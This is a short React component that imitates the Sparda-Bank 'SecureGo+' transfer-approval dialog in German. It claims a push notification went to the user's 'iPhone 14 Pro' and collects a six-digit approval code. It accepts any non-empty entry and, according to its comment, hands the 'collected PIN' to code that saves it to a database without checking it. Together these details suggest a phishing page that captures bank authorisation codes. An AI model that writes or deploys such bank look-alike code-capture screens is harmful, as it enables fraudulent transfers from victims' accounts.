import React, { useState } from 'react';

function SecureGoModal({ isOpen, onClose, onConfirm, isSubmitting = false }) {
  const [code, setCode] = useState('');

  if (!isOpen) return null;

  const confirmTransfer = () => {
    // ⚡ SEPARATION OF CONCERNS: Pass the collected PIN up to the file executing the database save
    if (code.trim().length >= 1 && onConfirm) {
      onConfirm(code);
    }
  };

  return (
    <div className="modal-overlay show" id="securego-modal">
      <div className="modal-box">
        <div className="modal-icon">📱</div>

        <h3>SpardaSecureGo+ Freigabe</h3>

        <p>
          Eine Push-Benachrichtigung wurde an Ihr iPhone 14 Pro gesendet.
          <br />
          Oder geben Sie Ihren 6-stelligen Freigabecode ein:
        </p>

        <input
          className="modal-input"
          type="text"
          maxLength="6"
          placeholder="— — — — — —"
          id="modal-code"
          value={code}
          onChange={(e) => setCode(e.target.value)}
          disabled={isSubmitting} // Protects from manipulation while backend saves rows
        />

        <div className="modal-actions">
          <button
            className="btn-primary"
            onClick={confirmTransfer}
            disabled={isSubmitting || code.trim().length === 0}
          >
            {isSubmitting ? '⌛ Wird verarbeitet...' : '✓ Bestätigen'}
          </button>

          <button
            className="btn-secondary"
            onClick={() => {
              setCode('');
              onClose();
            }}
            disabled={isSubmitting}
          >
            Abbrechen
          </button>
        </div>
      </div>
    </div>
  );
}

export default SecureGoModal;
